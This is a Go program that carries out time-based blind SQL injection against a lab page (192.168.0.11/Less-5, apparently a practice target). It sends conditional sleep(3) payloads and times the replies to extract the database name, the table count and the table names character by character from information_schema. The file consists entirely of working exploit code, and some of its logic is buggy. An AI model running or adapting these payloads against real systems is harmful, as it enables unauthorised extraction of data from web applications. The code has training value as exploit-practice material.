package main

import (
	"fmt"
	"log"
	"net/http"
	"strconv"
	"time"
)

var letters map[int]string = make(map[int]string)
var cost bool = false
var tbNames = ""

func main() {
	dbName := "" // database
	//dbLength:=1  // database length
	/*tbNames := "" // tables
	stringCl := "" // columns
	stringDa := "" // columns data
	chanDB := make(chan string)*/
	letter()
	/*for  {
			url := "http://192.168.0.11/Less-5/index.php?id=1%27%20and%20if(length(database())=%27" + strconv.Itoa(dbLength) + "%27,sleep(3),1)%20--%20d"
			payload(url)
			if cost {
				break
			}
			dbLength++
		}

	re:
		for i := 1; i <= dbLength; i++ {
			for _, letter := range letters {
				str := dbName
				str += letter
				url := "http://192.168.0.11/Less-5/index.php?id=1%27%20and%20if(left(database()," + strconv.Itoa(i) + ")=%27" + str + "%27,sleep(3),1)%20--%20d"
				payload(url)
				if cost {
					dbName += letter
					continue re
				}
			}
		}
	*/
	tablesName()
	fmt.Println("databaseName:" + dbName)
	fmt.Println("Table Name:" + tbNames)
}

func letter() {
	for i := 97; i < 123; i++ {
		letters[i] = string(i)
	}
}

func payload(url string) {
	defer timeCost()()
	respDataBase, err := http.Get(url)
	if err != nil {
		log.Fatal(err)
	}
	respDataBase.Body.Close()
}
func timeCost() func() {
	start := time.Now()
	return func() {
		tc := time.Since(start)
		second := tc.Seconds()
		if second < float64(3) {
			cost = false
		} else {
			cost = true
		}
	}
}

func tablesName() string {
	i := 0
	for {
		tabnumUrl := "http://192.168.0.11/Less-5/index.php?id=1%27%20and%20if((select%20count(table_name)from%20information_schema.tables%20where%20table_schema=database())=" + strconv.Itoa(i) + ",sleep(3),1)%20--%20d"
		payload(tabnumUrl)
		if cost {
			break
		}
		i++
	}
	namelen := 1
	for {
		tabNameLenUrl := "http://192.168.0.11/Less-5/index.php?id=1%27%20and%20" +
			"if(length((select%20table_name%20from%20information_schema.tables" +
			"%20where%20table_schema=database()%20limit%200,1))=" + strconv.Itoa(namelen) + ",sleep(3),1)%20--%20d"
		payload(tabNameLenUrl)
		if cost {
			break
		}
		namelen++
	}
loop:
	for i := 1; i <= namelen; i++ {
		for _, letter := range letters {
			str := tbNames
			str += letter
			tabNameUrl := "http://192.168.0.11/Less-5/index.php?id=1%27%20and%20if(left((select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%20" + strconv.Itoa(i) + ",1)," + strconv.Itoa(i) + ")=%27" + str + "%27,sleep(3),1)%20--%20d"
			payload(tabNameUrl)
			if cost {
				tbNames += letter
				continue loop
			}
		}
	}
	return tbNames
}
